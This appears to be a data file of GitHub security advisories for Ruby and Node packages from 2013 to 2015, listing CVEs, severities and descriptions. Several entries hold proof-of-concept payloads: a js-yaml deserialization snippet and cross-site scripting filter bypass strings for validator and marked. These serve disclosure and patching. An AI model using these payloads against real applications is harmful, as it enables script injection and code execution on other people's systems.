1602,18829,rdoc,GHSA-v2r9-c84j-v7xm,CVE-2013-0256,https://github.com/advisories/GHSA-v2r9-c84j-v7xm,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects rdoc,"darkfish.js in RDoc 2.3.0 through 3.12 and 4.x before 4.0.0.preview2.1, as used in Ruby, does not properly generate documents, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a crafted URL.",rubygems
1603,18839,rack,GHSA-85r7-w5mv-c849,CVE-2013-0262,https://github.com/advisories/GHSA-85r7-w5mv-c849,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects rack,"rack/file.rb (Rack::File) in Rack 1.5.x before 1.5.2 and 1.4.x before 1.4.5 allows attackers to access arbitrary files outside the intended root directory via a crafted PATH_INFO environment variable, probably a directory traversal vulnerability that is remotely exploitable, aka ""symlink path traversals.""",rubygems
1604,18822,json,GHSA-x457-cw4h-hq5f,CVE-2013-0269,https://github.com/advisories/GHSA-x457-cw4h-hq5f,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects json,"The JSON gem before 1.5.5, 1.6.x before 1.6.8, and 1.7.x before 1.7.7 for Ruby allows remote attackers to cause a denial of service (resource consumption) or bypass the mass assignment protection mechanism via a crafted JSON document that triggers the creation of arbitrary Ruby symbols or certain internal objects, as demonstrated by conducting a SQL injection attack against Ruby on Rails, aka ""Unsafe Object Creation Vulnerability.""",rubygems
1605,18828,activerecord,GHSA-gr44-7grc-37vq,CVE-2013-0276,https://github.com/advisories/GHSA-gr44-7grc-37vq,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects activerecord,"ActiveRecord in Ruby on Rails before 2.3.17, 3.1.x before 3.1.11, and 3.2.x before 3.2.12 allows remote attackers to bypass the attr_protected protection mechanism and modify protected model attributes via a crafted request.",rubygems
1606,18828,activerecord,GHSA-fhj9-cjjh-27vm,CVE-2013-0277,https://github.com/advisories/GHSA-fhj9-cjjh-27vm,critical,2017-10-24 18:33:37 UTC,Critical severity vulnerability that affects activerecord,ActiveRecord in Ruby on Rails before 2.3.17 and 3.x before 3.1.0 allows remote attackers to cause a denial of service or execute arbitrary code via crafted serialized attributes that cause the +serialize+ helper to deserialize arbitrary YAML.,rubygems
1607,19129,nori,GHSA-4936-rj25-6wm6,CVE-2013-0285,https://github.com/advisories/GHSA-4936-rj25-6wm6,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects nori,"The nori gem 2.0.x before 2.0.2, 1.1.x before 1.1.4, and 1.0.x before 1.0.3 for Ruby does not properly restrict casts of string values, which allows remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) involving nested XML entity references, by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",rubygems
1608,18817,activesupport,GHSA-xgr2-v94m-rc9g,CVE-2013-0333,https://github.com/advisories/GHSA-xgr2-v94m-rc9g,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects activesupport,"lib/active_support/json/backends/yaml.rb in Ruby on Rails 2.3.x before 2.3.16 and 3.0.x before 3.0.20 does not properly convert JSON data to YAML data for processing by a YAML parser, which allows remote attackers to execute arbitrary code, conduct SQL injection attacks, or bypass authentication via crafted data that triggers unsafe decoding, a different vulnerability than CVE-2013-0156.",rubygems
1609,27395,spree,GHSA-jxx8-v83v-rhw3,CVE-2013-1656,https://github.com/advisories/GHSA-jxx8-v83v-rhw3,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects spree,"Spree Commerce 1.0.x through 1.3.2 allows remote authenticated administrators to instantiate arbitrary Ruby objects and execute arbitrary commands via the (1) payment_method parameter to core/app/controllers/spree/admin/payment_methods_controller.rb; and the (2) promotion_action parameter to promotion_actions_controller.rb, (3) promotion_rule parameter to promotion_rules_controller.rb, and (4) calculator_type parameter to promotions_controller.rb in promo/app/controllers/spree/admin/, related to unsafe use of the constantize function.",rubygems
1610,19312,dragonfly,GHSA-p463-639r-q9g9,CVE-2013-1756,https://github.com/advisories/GHSA-p463-639r-q9g9,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects dragonfly,"The Dragonfly gem 0.7 before 0.8.6 and 0.9.x before 0.9.13 for Ruby, when used with Ruby on Rails, allows remote attackers to execute arbitrary code via a crafted request.",rubygems
1611,19032,crack,GHSA-m7fq-cf8q-35q7,CVE-2013-1800,https://github.com/advisories/GHSA-m7fq-cf8q-35q7,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects crack,"The crack gem 0.3.1 and earlier for Ruby does not properly restrict casts of string values, which might allow remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",rubygems
1612,18832,httparty,GHSA-mgx3-27hr-mfgp,CVE-2013-1801,https://github.com/advisories/GHSA-mgx3-27hr-mfgp,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects httparty,"The httparty gem 0.9.0 and earlier for Ruby does not properly restrict casts of string values, which might allow remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) by leveraging Action Pack support for YAML type conversion, a similar vulnerability to CVE-2013-0156.",rubygems
1613,19128,extlib,GHSA-9h36-4jf2-hx53,CVE-2013-1802,https://github.com/advisories/GHSA-9h36-4jf2-hx53,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects extlib,"The extlib gem 0.9.15 and earlier for Ruby does not properly restrict casts of string values, which might allow remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",rubygems
1614,19359,ruby-openid,GHSA-6c8p-qphv-668v,CVE-2013-1812,https://github.com/advisories/GHSA-6c8p-qphv-668v,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects ruby-openid,The ruby-openid gem before 2.2.2 for Ruby allows remote OpenID providers to cause a denial of service (CPU consumption) via (1) a large XRDS document or (2) an XML Entity Expansion (XEE) attack.,rubygems
1615,18828,activerecord,GHSA-3crr-9vmg-864v,CVE-2013-1854,https://github.com/advisories/GHSA-3crr-9vmg-864v,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects activerecord,"The Active Record component in Ruby on Rails 2.3.x before 2.3.18, 3.1.x before 3.1.12, and 3.2.x before 3.2.13 processes certain queries by converting hash keys to symbols, which allows remote attackers to cause a denial of service via crafted input to a where method.",rubygems
1616,18865,actionpack,GHSA-q759-hwvc-m3jg,CVE-2013-1855,https://github.com/advisories/GHSA-q759-hwvc-m3jg,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,"The sanitize_css method in lib/action_controller/vendor/html-scanner/html/sanitizer.rb in the Action Pack component in Ruby on Rails before 2.3.18, 3.0.x and 3.1.x before 3.1.12, and 3.2.x before 3.2.13 does not properly handle \n (newline) characters, which makes it easier for remote attackers to conduct cross-site scripting (XSS) attacks via crafted Cascading Style Sheets (CSS) token sequences.",rubygems
1617,18817,activesupport,GHSA-9c2j-593q-3g82,CVE-2013-1856,https://github.com/advisories/GHSA-9c2j-593q-3g82,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects activesupport,"The ActiveSupport::XmlMini_JDOM backend in lib/active_support/xml_mini/jdom.rb in the Active Support component in Ruby on Rails 3.0.x and 3.1.x before 3.1.12 and 3.2.x before 3.2.13, when JRuby is used, does not properly restrict the capabilities of the XML parser, which allows remote attackers to read arbitrary files or cause a denial of service (resource consumption) via vectors involving (1) an external DTD or (2) an external entity declaration in conjunction with an entity reference.",rubygems
1618,18865,actionpack,GHSA-j838-vfpq-fmf2,CVE-2013-1857,https://github.com/advisories/GHSA-j838-vfpq-fmf2,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,"The sanitize helper in lib/action_controller/vendor/html-scanner/html/sanitizer.rb in the Action Pack component in Ruby on Rails before 2.3.18, 3.0.x and 3.1.x before 3.1.12, and 3.2.x before 3.2.13 does not properly handle encoded : (colon) characters in URLs, which makes it easier for remote attackers to conduct cross-site scripting (XSS) attacks via a crafted scheme name, as demonstrated by including a &#x3a; sequence.",rubygems
1619,27168,passenger,GHSA-9qj7-jvg4-qr2x,CVE-2013-2119,https://github.com/advisories/GHSA-9qj7-jvg4-qr2x,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects passenger,"Phusion Passenger gem before 3.0.21 and 4.0.x before 4.0.5 for Ruby allows local users to cause a denial of service (prevent application start) or gain privileges by pre-creating a temporary ""config"" file in a directory with a predictable name in /tmp/ before it is used by the gem.",rubygems
1620,18955,mini_magick,GHSA-w754-gq8r-pf5f,CVE-2013-2616,https://github.com/advisories/GHSA-w754-gq8r-pf5f,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects mini_magick,lib/mini_magick.rb in the MiniMagick Gem 1.3.1 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a URL.,rubygems
1621,19282,puppet,GHSA-f7p5-w2cr-7cp7,CVE-2013-3567,https://github.com/advisories/GHSA-f7p5-w2cr-7cp7,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects puppet,"Puppet 2.7.x before 2.7.22 and 3.2.x before 3.2.2, and Puppet Enterprise before 2.8.2, deserializes untrusted YAML, which allows remote attackers to instantiate arbitrary Ruby classes and execute arbitrary code via a crafted REST API call.",rubygems
1622,27168,passenger,GHSA-w6rc-q387-vpgq,CVE-2013-4136,https://github.com/advisories/GHSA-w6rc-q387-vpgq,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects passenger,ext/common/ServerInstanceDir.h in Phusion Passenger gem before 4.0.6 for Ruby allows local users to gain privileges or possibly change the ownership of arbitrary directories via a symlink attack on a directory with a predictable name in /tmp/.,rubygems
1623,19030,actionmailer,GHSA-rg5m-3fqp-6px8,CVE-2013-4389,https://github.com/advisories/GHSA-rg5m-3fqp-6px8,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionmailer,Multiple format string vulnerabilities in log_subscriber.rb files in the log subscriber component in Action Mailer in Ruby on Rails 3.x before 3.2.15 allow remote attackers to cause a denial of service via a crafted e-mail address that is improperly handled during construction of a log message.,rubygems
1624,27811,wicked,GHSA-rprj-g6xc-p5gq,CVE-2013-4413,https://github.com/advisories/GHSA-rprj-g6xc-p5gq,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects wicked,Directory traversal vulnerability in controller/concerns/render_redirect.rb in the Wicked gem before 1.0.1 for Ruby allows remote attackers to read arbitrary files via a %2E%2E%2F (encoded dot dot slash) in the step.,rubygems
1625,19305,cocaine,GHSA-c43v-hrmg-56r4,CVE-2013-4457,https://github.com/advisories/GHSA-c43v-hrmg-56r4,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects cocaine,"The Cocaine gem 0.4.0 through 0.5.2 for Ruby allows context-dependent attackers to execute arbitrary commands via a crafted has object, related to recursive variable interpolation.",rubygems
1626,18865,actionpack,GHSA-699m-mcjm-9cw8,CVE-2013-4491,https://github.com/advisories/GHSA-699m-mcjm-9cw8,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/translation_helper.rb in the internationalization component in Ruby on Rails 3.x before 3.2.16 and 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via a crafted string that triggers generation of a fallback string by the i18n gem.,rubygems
1627,18859,i18n,GHSA-r5hc-9xx5-97rw,CVE-2013-4492,https://github.com/advisories/GHSA-r5hc-9xx5-97rw,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects i18n,Cross-site scripting (XSS) vulnerability in exceptions.rb in the i18n gem before 0.6.6 for Ruby allows remote attackers to inject arbitrary web script or HTML via a crafted I18n::MissingTranslationData.new call.,rubygems
1628,19539,omniauth-facebook,GHSA-cf36-985g-v73c,CVE-2013-4562,https://github.com/advisories/GHSA-cf36-985g-v73c,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects omniauth-facebook,"The omniauth-facebook gem 1.4.1 before 1.5.0 does not properly store the session parameter, which allows remote attackers to conduct cross-site request forgery (CSRF) attacks via the state parameter.",rubygems
1629,15997,js-yaml,GHSA-xxvw-45rp-3mj2,CVE-2013-4660,https://github.com/advisories/GHSA-xxvw-45rp-3mj2,critical,2017-10-24 18:33:37 UTC,Deserialization Code Execution in js-yaml,"Versions 2.0.4 and earlier of `js-yaml` are affected by a code execution vulnerability in the YAML deserializer.

## Proof of Concept
```
const yaml = require('js-yaml');

const x = `test: !!js/function >
function f() { 
console.log(1); 
}();`

yaml.load(x);
```


## Recommendation

Update js-yaml to version 2.0.5 or later, and ensure that all instances where the `.load()` method is called are updated to use `.safeLoad()` instead.",npm
1630,19282,puppet,GHSA-cj43-9h3w-v976,CVE-2013-4761,https://github.com/advisories/GHSA-cj43-9h3w-v976,moderate,2017-10-24 18:33:37 UTC,Puppet allows remote attackers to execute arbitrary Ruby programs from the master via the resource_type service,"Unspecified vulnerability in Puppet 2.7.x before 2.7.23 and 3.2.x before 3.2.4, and Puppet Enterprise 2.8.x before 2.8.3 and 3.0.x before 3.0.1, allows remote attackers to execute arbitrary Ruby programs from the master via the resource_type service.  NOTE: this vulnerability can only be exploited utilizing unspecified ""local file system access"" to the Puppet Master.",rubygems
1631,19312,dragonfly,GHSA-qrgf-jqqm-x7xv,CVE-2013-5671,https://github.com/advisories/GHSA-qrgf-jqqm-x7xv,high,2017-10-24 18:33:37 UTC,Code injection in dragonfly gem,lib/dragonfly/imagemagickutils.rb in the fog-dragonfly gem 0.8.2 for Ruby allows remote attackers to execute arbitrary commands via unspecified vectors.,rubygems
1632,18865,actionpack,GHSA-mpxf-gcw2-pw5q,CVE-2013-6414,https://github.com/advisories/GHSA-mpxf-gcw2-pw5q,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,actionpack/lib/action_view/lookup_context.rb in Action View in Ruby on Rails 3.x before 3.2.16 and 4.x before 4.0.2 allows remote attackers to cause a denial of service (memory consumption) via a header containing an invalid MIME type that leads to excessive caching.,rubygems
1633,18865,actionpack,GHSA-6h5q-96hp-9jgm,CVE-2013-6415,https://github.com/advisories/GHSA-6h5q-96hp-9jgm,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,Cross-site scripting (XSS) vulnerability in the number_to_currency helper in actionpack/lib/action_view/helpers/number_helper.rb in Ruby on Rails before 3.2.16 and 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via the unit parameter.,rubygems
1634,18865,actionpack,GHSA-w37c-q653-qg95,CVE-2013-6416,https://github.com/advisories/GHSA-w37c-q653-qg95,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,Cross-site scripting (XSS) vulnerability in the simple_format helper in actionpack/lib/action_view/helpers/text_helper.rb in Ruby on Rails 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via a crafted HTML attribute.,rubygems
1635,18865,actionpack,GHSA-wpw7-wxjm-cw8r,CVE-2013-6417,https://github.com/advisories/GHSA-wpw7-wxjm-cw8r,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"actionpack/lib/action_dispatch/http/request.rb in Ruby on Rails before 3.2.16 and 4.x before 4.0.2 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request that leverages (1) third-party Rack middleware or (2) custom Rack middleware.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-0155.",rubygems
1636,26811,sprout,GHSA-229r-pqp6-8w6g,CVE-2013-6421,https://github.com/advisories/GHSA-229r-pqp6-8w6g,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects sprout,The unpack_zip function in archive_unpacker.rb in the sprout gem 0.7.246 for Ruby allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a (1) filename or (2) path.,rubygems
1637,18959,will_paginate,GHSA-8r6h-7x9g-xmw9,CVE-2013-6459,https://github.com/advisories/GHSA-8r6h-7x9g-xmw9,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects will_paginate,Cross-site scripting (XSS) vulnerability in the will_paginate gem before 3.0.5 for Ruby allows remote attackers to inject arbitrary web script or HTML via vectors involving generated pagination links.,rubygems
1638,16255,validator,GHSA-qpjp-7rp2-9c3f,CVE-2013-7451,https://github.com/advisories/GHSA-qpjp-7rp2-9c3f,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,The validator module before 1.1.0 for Node.js allows remote attackers to bypass the XSS filter via a nested tag.,npm
1639,16255,validator,GHSA-rh6c-q938-3r9q,CVE-2013-7452,https://github.com/advisories/GHSA-rh6c-q938-3r9q,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,The validator module before 1.1.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via a crafted javascript URI.,npm
1640,16255,validator,GHSA-552w-rqg8-gxxm,CVE-2013-7453,https://github.com/advisories/GHSA-552w-rqg8-gxxm,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,The validator module before 1.1.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via vectors related to UI redressing.,npm
1641,16255,validator,GHSA-q4qq-fm7q-cwp5,CVE-2013-7454,https://github.com/advisories/GHSA-q4qq-fm7q-cwp5,moderate,2017-10-24 18:33:36 UTC,Multiple XSS Filter Bypasses in validator,"Versions of `validator` prior to 1.1.0 are affected by several cross-site scripting vulnerabilities due to bypasses discovered in the blacklist-based filter.


## Proof of Concept
Various inputs that could bypass the filter were discovered:

Improper parsing of nested tags:

```
<s <onmouseover=""alert(1)""> <;s onmouseover=""alert(1)"">This is a test</s>
```

Incomplete filtering of javascript: URIs:

```
<a href=""javascriptJ a V a S c R iPt::alert(1)"" ""<s>"">test</a>
```

UI Redressing:

```
<div style=""z-index: 9999999; background-color: green; width: 100%; height: 100%"">
<h1>You have won</h1>Please click the link and enter your login details:
<a href=""http://example.com/"">http://good.com</a>
</div>
```

Bypass via Nested Forbidden Strings:

```
<scrRedirecRedirect 302t 302ipt type=""text/javascript"">prompt(1);</scrRedirecRedirect 302t 302ipt>
```

Additional bypasses were discovered by Krzysztof Kotowicz in 2012 when auditing CodeIgniter's XSS filtering function, which this code was based off of.


## Recommendation

If you are a developer currently using the xss filter function from the validator package, you should consider replacing it with the escape filter function from the same package. This function replaces all instances of angle brackets (<, >), ampersands, and quotation marks, so no HTML tags will be processed.",npm
1642,27059,rbovirt,GHSA-ww79-8xwv-932x,CVE-2014-0036,https://github.com/advisories/GHSA-ww79-8xwv-932x,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rbovirt,"The rbovirt gem before 0.0.24 for Ruby uses the rest-client gem with SSL verification disabled, which allows remote attackers to conduct man-in-the-middle attacks via unspecified vectors.",rubygems
1643,18816,rails,GHSA-m46p-ggm5-5j83,CVE-2014-0081,https://github.com/advisories/GHSA-m46p-ggm5-5j83,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails,"Multiple cross-site scripting (XSS) vulnerabilities in actionview/lib/action_view/helpers/number_helper.rb in Ruby on Rails before 3.2.17, 4.0.x before 4.0.3, and 4.1.x before 4.1.0.beta2 allow remote attackers to inject arbitrary web script or HTML via the (1) format, (2) negative_format, or (3) units parameter to the (a) number_to_currency, (b) number_to_percentage, or (c) number_to_human helper.",rubygems
1644,18865,actionpack,GHSA-7cgp-c3g7-qvrw,CVE-2014-0082,https://github.com/advisories/GHSA-7cgp-c3g7-qvrw,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"actionpack/lib/action_view/template/text.rb in Action View in Ruby on Rails 3.x before 3.2.17 converts MIME type strings to symbols during use of the :text option to the render method, which allows remote attackers to cause a denial of service (memory consumption) by including these strings in headers.",rubygems
1645,18865,actionpack,GHSA-6x85-j5j2-27jx,CVE-2014-0130,https://github.com/advisories/GHSA-6x85-j5j2-27jx,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"Directory traversal vulnerability in actionpack/lib/abstract_controller/base.rb in the implicit-render implementation in Ruby on Rails before 3.2.18, 4.0.x before 4.0.5, and 4.1.x before 4.1.1, when certain route globbing configurations are enabled, allows remote attackers to read arbitrary files via a crafted request.",rubygems
1646,27437,rack-ssl,GHSA-v3rr-cph9-2g2q,CVE-2014-2538,https://github.com/advisories/GHSA-v3rr-cph9-2g2q,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rack-ssl,"Cross-site scripting (XSS) vulnerability in lib/rack/ssl.rb in the rack-ssl gem before 1.4.0 for Ruby allows remote attackers to inject arbitrary web script or HTML via a URI, which might not be properly handled by third-party adapters such as JRuby-Rack.",rubygems
1647,19301,facter,GHSA-92v7-pq4h-58j5,CVE-2014-3248,https://github.com/advisories/GHSA-92v7-pq4h-58j5,moderate,2017-10-24 18:33:36 UTC,"Moderate severity vulnerability that affects facter, hiera, mcollective-client, and puppet","Untrusted search path vulnerability in Puppet Enterprise 2.8 before 2.8.7, Puppet before 2.7.26 and 3.x before 3.6.2, Facter 1.6.x and 2.x before 2.0.2, Hiera before 1.3.4, and Mcollective before 2.5.2, when running with Ruby 1.9.1 or earlier, allows local users to gain privileges via a Trojan horse file in the current working directory, as demonstrated using (1) rubygems/defaults/operating_system.rb, (2) Win32API.rb, (3) Win32API.so, (4) safe_yaml.rb, (5) safe_yaml/deep.rb, or (6) safe_yaml/deep.so; or (7) operatingsystem.rb, (8) operatingsystem.so, (9) osfamily.rb, or (10) osfamily.so in puppet/confine.",rubygems
1648,18828,activerecord,GHSA-mhwp-qhpc-h3jm,CVE-2014-3482,https://github.com/advisories/GHSA-mhwp-qhpc-h3jm,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects activerecord,SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql_adapter.rb in the PostgreSQL adapter for Active Record in Ruby on Rails 2.x and 3.x before 3.2.19 allows remote attackers to execute arbitrary SQL commands by leveraging improper bitstring quoting.,rubygems
1649,18828,activerecord,GHSA-r8fh-hq2p-7qhq,CVE-2014-3483,https://github.com/advisories/GHSA-r8fh-hq2p-7qhq,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects activerecord,SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql/quoting.rb in the PostgreSQL adapter for Active Record in Ruby on Rails 4.x before 4.0.7 and 4.1.x before 4.1.3 allows remote attackers to execute arbitrary SQL commands by leveraging improper range quoting.,rubygems
1650,18828,activerecord,GHSA-9rf5-jm6f-2fmm,CVE-2014-3514,https://github.com/advisories/GHSA-9rf5-jm6f-2fmm,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects activerecord,activerecord/lib/active_record/relation/query_methods.rb in Active Record in Ruby on Rails 4.0.x before 4.0.9 and 4.1.x before 4.1.5 allows remote attackers to bypass the strong parameters protection mechanism via crafted input to an application that makes create_with calls.,rubygems
1651,16345,hapi,GHSA-cqr7-78pj-3g7j,CVE-2014-3742,https://github.com/advisories/GHSA-cqr7-78pj-3g7j,high,2017-10-24 18:33:36 UTC,File Descriptor Leak Can Cause DoS Vulnerability in hapi,"Versions 2.0.x and 2.1.x of hapi are vulnerable to a denial of service attack via a file descriptor leak. 

When triggered repeatedly, this leak will cause the server to run out of file descriptors and the node process to die. The effort required to take down a server depends on the process file descriptor limit. No other side effects or exploits have been identified.



## Recommendation

- Please upgrade to version 2.2.x or above as soon as possible.",npm
1652,17093,send,GHSA-xwg4-93c6-3h42,CVE-2014-6394,https://github.com/advisories/GHSA-xwg4-93c6-3h42,low,2017-10-24 18:33:36 UTC,Directory Traversal in send,"Versions 0.8.3 and earlier of `send` are affected by a directory traversal vulnerability. When relying on the root option to restrict file access it may be possible for an application consumer to escape out of the restricted directory and access files in a similarly named directory. 

For example, `static(_dirname + '/public')` would allow access to `_dirname + '/public-restricted'`.


## Recommendation

Update to version 0.8.4 or later.",npm
1653,16125,qs,GHSA-jjv7-qpx3-h62q,CVE-2014-7191,https://github.com/advisories/GHSA-jjv7-qpx3-h62q,high,2017-10-24 18:33:36 UTC,Denial-of-Service Memory Exhaustion in qs,"Versions prior to 1.0 of `qs` are affected by a denial of service condition. This condition is triggered by parsing a crafted string that deserializes into very large sparse arrays, resulting in the process running out of memory and eventually crashing.


## Recommendation

Update to version 1.0.0 or later.",npm
1654,18865,actionpack,GHSA-29gr-w57f-rpfw,CVE-2014-7818,https://github.com/advisories/GHSA-29gr-w57f-rpfw,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"Directory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.20, 4.0.x before 4.0.11, 4.1.x before 4.1.7, and 4.2.x before 4.2.0.beta3, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via a /..%2F sequence.",rubygems
1655,18932,sprockets,GHSA-33pp-3763-mrfp,CVE-2014-7819,https://github.com/advisories/GHSA-33pp-3763-mrfp,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects sprockets,"Multiple directory traversal vulnerabilities in server.rb in Sprockets before 2.0.5, 2.1.x before 2.1.4, 2.2.x before 2.2.3, 2.3.x before 2.3.3, 2.4.x before 2.4.6, 2.5.x before 2.5.1, 2.6.x and 2.7.x before 2.7.1, 2.8.x before 2.8.3, 2.9.x before 2.9.4, 2.10.x before 2.10.2, 2.11.x before 2.11.3, 2.12.x before 2.12.3, and 3.x before 3.0.0.beta.3, as distributed with Ruby on Rails 3.x and 4.x, allow remote attackers to determine the existence of files outside the application root via a ../ (dot dot slash) sequence with (1) double slashes or (2) URL encoding.",rubygems
1656,19498,sentry-raven,GHSA-c9c5-9fpr-m882,CVE-2014-9490,https://github.com/advisories/GHSA-c9c5-9fpr-m882,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects sentry-raven,The numtok function in lib/raven/okjson.rb in the raven-ruby gem before 0.12.2 for Ruby allows remote attackers to cause a denial of service via a large exponent value in a scientific number.,rubygems
1657,16255,validator,GHSA-9959-c6q6-6qp3,,https://github.com/advisories/GHSA-9959-c6q6-6qp3,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,**Withdrawn:** Duplicate of GHSA-79mx-88w7-8f7q,npm
1658,16065,marked,GHSA-cfjh-p3g4-3q2f,CVE-2015-1370,https://github.com/advisories/GHSA-cfjh-p3g4-3q2f,moderate,2017-10-24 18:33:36 UTC,VBScript Content Injection in marked,"Versions 0.3.2 and earlier of `marked` are affected by a cross-site scripting vulnerability even when `sanitize:true` is set. 

## Proof of Concept ( IE10 Compatibility Mode Only )

`[xss link](vbscript:alert(1&#41;)`

will get a link

`<a href=""vbscript:alert(1)"">xss link</a>`


## Recommendation

Update to version 0.3.3 or later.",npm
1659,18864,jquery-rails,GHSA-4whc-pp4x-9pf3,CVE-2015-1840,https://github.com/advisories/GHSA-4whc-pp4x-9pf3,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects jquery-rails and jquery-ujs,"jquery_ujs.js in jquery-rails before 3.1.3 and 4.x before 4.0.4 and rails.js in jquery-ujs before 1.0.4, as used with Ruby on Rails 3.x and 4.x, allow remote attackers to bypass the Same Origin Policy, and trigger transmission of a CSRF token to a different-domain web server, via a leading space character in a URL within an attribute value.",rubygems
1660,18985,paperclip,GHSA-6jvm-3j5h-79f6,CVE-2015-2963,https://github.com/advisories/GHSA-6jvm-3j5h-79f6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects paperclip,"The thoughtbot paperclip gem before 4.2.2 for Ruby does not consider the content-type value during media-type validation, which allows remote attackers to upload HTML documents and conduct cross-site scripting (XSS) attacks via a spoofed value, as demonstrated by image/jpeg.",rubygems
1661,27066,web-console,GHSA-67j6-xv27-w6ww,CVE-2015-3224,https://github.com/advisories/GHSA-67j6-xv27-w6ww,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects web-console,"request.rb in Web Console before 2.1.3, as used with Ruby on Rails 3.x and 4.x, does not properly restrict the use of X-Forwarded-For headers in determining a client's IP address, which allows remote attackers to bypass the whitelisted_ips protection mechanism via a crafted request.",rubygems
1662,18839,rack,GHSA-rgr4-9jh5-j4j6,CVE-2015-3225,https://github.com/advisories/GHSA-rgr4-9jh5-j4j6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rack,"lib/rack/utils.rb in Rack before 1.5.4 and 1.6.x before 1.6.2, as used with Ruby on Rails 3.x and 4.x and other products, allows remote attackers to cause a denial of service (SystemStackError) via a request with a large parameter depth.",rubygems
1663,18817,activesupport,GHSA-j96r-xvjq-r9pg,CVE-2015-3227,https://github.com/advisories/GHSA-j96r-xvjq-r9pg,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects activesupport,"The (1) jdom.rb and (2) rexml.rb components in Active Support in Ruby on Rails before 4.1.11 and 4.2.x before 4.2.2, when JDOM or REXML is enabled, allow remote attackers to cause a denial of service (SystemStackError) via a large XML document depth.",rubygems
1664,18836,rest-client,GHSA-mx9f-w8qq-q5jf,CVE-2015-3448,https://github.com/advisories/GHSA-mx9f-w8qq-q5jf,low,2017-10-24 18:33:36 UTC,Low severity vulnerability that affects rest-client,"REST client for Ruby (aka rest-client) before 1.7.3 logs usernames and passwords, which allows local users to obtain sensitive information by reading the log.",rubygems
